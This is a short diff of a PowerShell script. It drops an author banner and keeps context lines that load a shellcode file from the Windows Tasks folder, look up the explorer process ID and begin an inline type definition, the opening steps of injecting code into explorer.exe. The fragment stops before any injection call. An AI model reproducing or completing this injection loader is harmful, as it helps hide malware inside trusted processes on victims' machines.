@@ -1,5 +1,3 @@
-# Crafted by Ezan0x — "In security, as in life, be like water: adaptable, resilient, and always ready to flow around obstacles… or through them."
-
 $shellcode = [System.IO.File]::ReadAllBytes("C:\Windows\Tasks\agent.bin")
 $procid = (Get-Process -Name explorer).Id
 Add-Type -TypeDefinition @"
